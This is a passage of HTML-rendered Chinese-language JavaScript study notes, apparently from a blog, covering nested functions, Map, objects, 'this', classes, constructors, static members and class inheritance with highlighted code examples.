class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*array.<span class="property">length</span>);</span><br><span class="line">        currentindex-=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> temp=array[currentindex];</span><br><span class="line">        array[currentindex]=array[randomindex];</span><br><span class="line">        array[randomindex]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">xipai</span>(cards)); </span><br></pre></td></tr></table></figure>

<p><strong>嵌套函数</strong></p>
<p>外面的函数有权访问内在的函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例1</span></span><br><span class="line"><span class="keyword">let</span> username=<span class="string">&quot;Yuleiyun&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> userno=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//showname();</span></span><br><span class="line"><span class="comment">//showno(); //这样我是无权访问内部函数了</span></span><br><span class="line"><span class="title function_">login</span>();<span class="comment">//所以要依靠外部函数去访问，可以理解为内在函数被保护了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">showname</span>();</span><br><span class="line">    <span class="title function_">showno</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showname</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`welcome! <span class="subst">$&#123;username&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showno</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`you have <span class="subst">$&#123;userno&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*function showname()&#123;</span></span><br><span class="line"><span class="comment">    console.log(`welcome! $&#123;username&#125;`);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function showno()&#123;</span></span><br><span class="line"><span class="comment">    console.log(`you have $&#123;userno&#125;`);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>map 键值对</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jiangjin=<span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">    [<span class="string">&quot;wo&quot;</span>,<span class="number">100</span>],</span><br><span class="line">    [<span class="string">&quot;ta&quot;</span>,<span class="number">200</span>],</span><br><span class="line">    [<span class="string">&quot;you&quot;</span>,<span class="number">300</span>]</span><br><span class="line">]);</span><br><span class="line">jiangjin.<span class="title function_">set</span>(<span class="string">&quot;he&quot;</span>,<span class="number">500</span>);<span class="comment">//添加</span></span><br><span class="line">jiangjin.<span class="title function_">delete</span>(<span class="string">&quot;he&quot;</span>);<span class="comment">//删除</span></span><br><span class="line">jiangjin.<span class="title function_">forEach</span>(<span class="function">(<span class="params">val,key</span>)=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name:<span class="subst">$&#123;key&#125;</span>,money:<span class="subst">$&#123;val&#125;</span>`</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">name:wo,money:100</span></span><br><span class="line"><span class="comment">name:ta,money:200</span></span><br><span class="line"><span class="comment">name:you,money:300</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jiangjin.<span class="title function_">has</span>(<span class="string">&quot;ta&quot;</span>));<span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jiangjin.<span class="property">size</span>);<span class="comment">//3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> total=<span class="number">0</span>;</span><br><span class="line">total+=jiangjin.<span class="title function_">get</span>(<span class="string">&quot;wo&quot;</span>);<span class="comment">//获取奖金总数</span></span><br><span class="line">total+=jiangjin.<span class="title function_">get</span>(<span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);<span class="comment">//400</span></span><br></pre></td></tr></table></figure>

<p><strong>object</strong></p>
<p>对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">属性：一个对象有什么</span></span><br><span class="line"><span class="comment">方法：一个对象能做什么</span></span><br><span class="line"><span class="comment">使用 . 去访问属性和方法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Yuleiyun&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">19</span>,</span><br><span class="line">    <span class="attr">color</span>:<span class="string">&quot;blue&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;He&#x27;s Eatting!&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">study</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;He&#x27;s studying!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">color</span>);</span><br><span class="line">person.<span class="title function_">eat</span>();</span><br><span class="line">person.<span class="title function_">study</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yuleiyun</span></span><br><span class="line"><span class="comment">index.js:417 19</span></span><br><span class="line"><span class="comment">index.js:418 blue</span></span><br><span class="line"><span class="comment">index.js:410 He&#x27;s Eatting!</span></span><br><span class="line"><span class="comment">index.js:413 He&#x27;s studying!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>this关键字</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person1=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Yuleiyun&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="comment">// console.log(`$&#123;name&#125; is Eatting!`); //读不到</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is Eatting!`</span>); <span class="comment">//等价于 $&#123;person1.name&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person2=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;asdasd&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is Eatting!`</span>);<span class="comment">//等价于 $&#123;person2.name&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">eat</span>();<span class="comment">//Yuleiyun is Eatting!</span></span><br><span class="line">person2.<span class="title function_">eat</span>();<span class="comment">//asdasd is Eatting!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此外，它可以替换window对象的属性</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;123213&quot;</span>;</span><br><span class="line"><span class="comment">//实质上是</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="string">&quot;123213&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>classes</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 创建对象</span></span><br><span class="line"><span class="comment"> 定义对象的属性和方法</span></span><br><span class="line"><span class="comment"> 构造每一个特定的实例</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    age=<span class="number">19</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eat sth&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">study</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;study sth&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">age</span>+<span class="number">1</span>);<span class="comment">//20</span></span><br><span class="line">p1.<span class="title function_">eat</span>();<span class="comment">//eat sth</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">age</span>+<span class="number">2</span>);<span class="comment">//21</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p3.<span class="property">age</span>+<span class="number">3</span>);<span class="comment">//22</span></span><br></pre></td></tr></table></figure>

<p>classes与上面object的关系，如果仅仅是object，它会需要重新构造属性和方法；但是class，只需要一个模板即可，仅仅只是声明一个个实例即可访问</p>
<p><strong>constructor</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//constructor</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类的一种特殊方法，接受参数、分配属性</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,color</span>)&#123;<span class="comment">//就是constuctor，不可以自定义</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span>=color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">study</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is studying sth`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;Yu&quot;</span>,<span class="number">14</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">name</span>);<span class="comment">//Yu</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">age</span>);<span class="comment">//14</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">color</span>);<span class="comment">//blue</span></span><br><span class="line">p1.<span class="title function_">study</span>();<span class="comment">//Yu is studying sth</span></span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;Lei&quot;</span>,<span class="number">21</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">name</span>);<span class="comment">//Lei</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">age</span>);<span class="comment">//21</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">color</span>);<span class="comment">//red</span></span><br><span class="line">p2.<span class="title function_">study</span>();<span class="comment">//Lei is studying sth</span></span><br></pre></td></tr></table></figure>

<p><strong>static 关键字</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    numbers=<span class="number">0</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">numbers</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//想要统计人的数量，应该是每创建一个，numbers就+1，</span></span><br><span class="line"><span class="comment">//但是呢，创建了三个，都是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p3.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="comment">//因为每次numbers都是从0开始，而不是累加性质，所以要引入静态变量</span></span><br></pre></td></tr></table></figure>

<p><strong>static 属性</strong></p>
<p>静态属性的话，偏向于缓存，统计</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> numbers=<span class="number">0</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="title class_">Person</span>.<span class="property">numbers</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">numbers</span>);<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p><strong>static 方法</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// start()&#123;</span></span><br><span class="line">    <span class="comment">//     console.log(&quot;here we go!&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;here we go!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// p1.start();</span></span><br><span class="line"><span class="comment">// p2.start();</span></span><br><span class="line"><span class="comment">// p3.start();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//我的本意是，跑步，三个人一起跑，而不是各跑各的</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="title function_">start</span>();<span class="comment">//here we go!</span></span><br></pre></td></tr></table></figure>

<p>所以为什么，Math.rand()，而不是<code>const math=new Math();math.rand()</code>呢</p>
<p>函数库都是静态方法，就是封装好了，直接调用，无法扩展，性能上好一点</p>
<p><strong>继承，inheritance</strong></p>
<p>子类与父类的这种，嗯，子类可以继承父类的公有成员和函数，解决一些类上面不必要的重复，公共的函数就直接用，也重写一下，还可以加自己的扩展函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常情况下：</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;fish&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">swim</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is swimming!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;dog&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is running!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;bird&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fly</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is flying!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常情况下，三个类，<strong>Fish、Dog、Bird</strong>，它们有共同属性 <code>alive</code>，公共方法 <code>eat,sleep</code>，而且它们的都有共性是 <strong>Animal</strong>，所以</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;fish&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">swim</span>(<span 